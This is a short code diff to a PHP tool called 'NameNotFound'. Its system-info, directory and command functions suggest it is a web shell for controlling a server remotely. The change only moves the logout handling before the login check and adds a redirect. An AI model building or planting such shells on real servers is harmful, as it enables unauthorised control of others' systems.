@@ -5,7 +5,7 @@
 /* ----------------- */
 
 /* >>>>>>>>>>>>>>>>> */
-    @define('VERSION', '1.1b');
+    @define('VERSION', '1.1c');
     @define('NAME', 'NameNotFound');
     @define('AUTHOR', 'CosasDePuma');
 
@@ -225,6 +225,13 @@
     /* ----------------- */
 
 /* >>>>>>>>>>>>>>>>> */
+    // Log out
+    if(isset($_GET['out'])) {
+        unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
+        header("Location: http://" . $_SERVER['HTTP_HOST'] . "/");
+        die();
+    }
+
     // Check if we are not logging
     if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
         // Check if:
@@ -243,9 +250,4 @@
 
     // Do cool things!
     GetSysInfo(); GetDirectory(); SetCommands(); ShowControlPanel();
-
-    // Log out
-    if(isset($_GET['out'])) {
-        unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
-    }
 ?>
